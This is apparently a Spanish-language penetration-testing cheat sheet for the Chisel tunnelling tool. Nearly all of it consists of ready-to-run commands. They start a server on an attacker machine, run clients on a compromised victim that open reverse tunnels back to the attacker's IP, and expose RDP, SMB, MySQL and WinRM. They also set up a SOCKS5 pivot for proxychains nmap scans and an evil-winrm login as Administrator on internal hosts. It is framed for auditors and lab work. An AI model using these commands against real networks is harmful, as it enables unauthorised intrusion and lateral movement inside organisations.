# Chisel & Pivoting (Linux / Windows)

Guía rápida de uso de **Chisel** para reenvío de puertos (Port Forwarding), túneles reversos y pivoting mediante proxy SOCKS5.

---

## 1. Servidor Chisel (Máquina Atacante)

El servidor se levanta en la máquina del auditor para recibir las conexiones de los clientes internos.

```bash
# Modo servidor básico en puerto específico
chisel server --reverse --port 8081
./chisel server --reverse -p 4444

# Servidor con autenticación por usuario y contraseña
chisel server --reverse --port 8081 --auth "auditor:SuperSecretPass123"

# Servidor con compresión habilitada (reduce consumo de ancho de banda)
chisel server --reverse --port 8081 --compress

# Modo verbose (detalles de conexión en tiempo real)
chisel server --reverse --port 8081 -v
```

---

## 2. Cliente Chisel (Máquina Víctima)

El cliente se ejecuta en la máquina comprometida para redirigir servicios locales hacia la máquina del atacante.

```powershell
# Sintaxis general:
# client <IP_ATACANTE>:<PUERTO_SERVER> R:<PUERTO_LOCAL_ATACANTE>:127.0.0.1:<PUERTO_VICTIMA>

# En Windows (ej. exponer puerto 8888 o RDP 3389)
.\chisel.exe client 10.10.14.X:8081 R:8888:127.0.0.1:8888
.\chisel.exe client 10.10.14.X:4444 R:3389:127.0.0.1:3389

# En Linux
./chisel client 10.10.14.X:8081 R:8888:127.0.0.1:8888
```

---

## 3. Reenvío de Múltiples Puertos en un Solo Comando

Se pueden encadenar múltiples directivas `R:` para exponer varios servicios simultáneamente (por ejemplo: SMB, MySQL y WinRM).

```powershell
.\chisel.exe client 10.10.14.X:8081 R:8888:127.0.0.1:8888 R:3306:127.0.0.1:3306 R:445:127.0.0.1:445
```

---

## 4. Reenvío de Puertos hacia otra Máquina de la Red Interna

Permite redirigir un puerto de un equipo interno al que la máquina víctima tiene acceso, pero el atacante no.

```bash
# En el atacante
./chisel server --reverse --port 8081 -v
```

```powershell
# En la máquina víctima intermedia:
# Redirige el puerto 8080 del host interno hacia el puerto 8888 del atacante
.\chisel.exe client 10.10.14.X:8081 R:8888:192.168.20.50:8080
```

---

## 5. Pivoting Completo con SOCKS5 y Proxychains

Crea un túnel dinámico para alcanzar cualquier IP y puerto de la red interna a través de la máquina comprometida.

### Paso 1: Levantar servidor en atacante
```bash
chisel server --reverse -p 4444
```

### Paso 2: Conectar cliente en víctima con SOCKS
```powershell
.\chisel.exe client 10.10.14.X:4444 R:1080:socks
```

### Paso 3: Configurar Proxychains en el atacante
Añadir la línea al final de `/etc/proxychains4.conf` (o `/etc/proxychains.conf`):
```text
socks5 127.0.0.1 1080
```

### Paso 4: Operar a través de la red interna
```bash
# Escaneo de red interna
proxychains nmap -sT -Pn 192.168.1.0/24

# Conexión remota por WinRM
proxychains evil-winrm -i 192.168.1.10 -u Administrator -p 'Password123!'
```
